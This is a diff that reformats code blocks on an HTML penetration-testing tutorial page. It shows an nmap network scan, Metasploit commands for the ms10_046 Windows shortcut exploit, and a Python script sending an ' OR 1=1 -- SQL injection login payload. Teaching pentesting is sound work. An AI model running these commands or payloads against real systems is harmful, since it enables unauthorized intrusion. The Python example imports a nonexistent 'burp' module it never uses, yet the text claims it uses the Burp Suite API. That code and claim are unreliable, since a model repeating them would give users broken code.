@@ -170,34 +170,31 @@
 * <strong>Wireshark</strong>: A network protocol analyzer used to capture and analyze network traffic.</p>
 <h3 id="practical-example-using-nmap-to-conduct-a-network-scan">Practical Example: Using Nmap to Conduct a Network Scan</h3>
 <p>Here is an example of how to use Nmap to conduct a network scan:</p>
-<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-sS<span class="w"> </span>-O<span class="w"> </span><span class="m">192</span>.168.1.1-100
-</code></pre></div>
-
+<pre><code class="language-bash">nmap -sS -O 192.168.1.1-100
+</code></pre>
 <p>This command scans the IP range 192.168.1.1-100 using a TCP SYN scan (-sS) and attempts to identify the operating system and services running on each host (-O).</p>
 <h3 id="practical-example-using-metasploit-to-exploit-a-vulnerability">Practical Example: Using Metasploit to Exploit a Vulnerability</h3>
 <p>Here is an example of how to use Metasploit to exploit a vulnerability:</p>
-<div class="codehilite"><pre><span></span><code><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">fileformat</span><span class="o">/</span><span class="n">ms10_046_shortcut_icon</span>
-<span class="n">set</span><span class="w"> </span><span class="no">RHOST</span><span class="w"> </span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">100</span>
-<span class="n">set</span><span class="w"> </span><span class="no">LHOST</span><span class="w"> </span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">200</span>
-<span class="n">exploit</span>
-</code></pre></div>
-
+<pre><code class="language-ruby">use exploit/windows/fileformat/ms10_046_shortcut_icon
+set RHOST 192.168.1.100
+set LHOST 192.168.1.200
+exploit
+</code></pre>
 <p>This code uses the Metasploit framework to exploit a vulnerability in the Windows shortcut icon handler, allowing an attacker to execute arbitrary code on the target system.</p>
 <h3 id="practical-example-using-burp-suite-to-identify-sql-injection-vulnerabilities">Practical Example: Using Burp Suite to Identify SQL Injection Vulnerabilities</h3>
 <p>Here is an example of how to use Burp Suite to identify SQL injection vulnerabilities:</p>
-<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">from</span> <span class="nn">burp</span> <span class="kn">import</span> <span class="n">Intruder</span>
+<pre><code class="language-python">import requests
+from burp import Intruder
 
-<span class="c1"># Define the URL and payload</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://example.com/login&quot;</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;username=admin&amp;password=abc&#39; OR 1=1 --&quot;</span>
+# Define the URL and payload
+url = &quot;http://example.com/login&quot;
+payload = &quot;username=admin&amp;password=abc' OR 1=1 --&quot;
 
-<span class="c1"># Send the request and analyze the response</span>
-<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
-<span class="k">if</span> <span class="s2">&quot;login successful&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;SQL injection vulnerability identified&quot;</span><span class="p">)</span>
-</code></pre></div>
-
+# Send the request and analyze the response
+response = requests.post(url, data=payload)
+if &quot;login successful&quot; in response.text:
+    print(&quot;SQL injection vulnerability identified&quot;)
+</code></pre>
 <p>This code uses the Burp Suite API to send a request to a web application with a SQL injection payload and analyzes the response to determine if the vulnerability exists.</p>
 <h2 id="common-problems-and-solutions">Common Problems and Solutions</h2>
 <p>One common problem faced by penetration testers is the lack of visibility into the system or network being tested. This can be solved by:
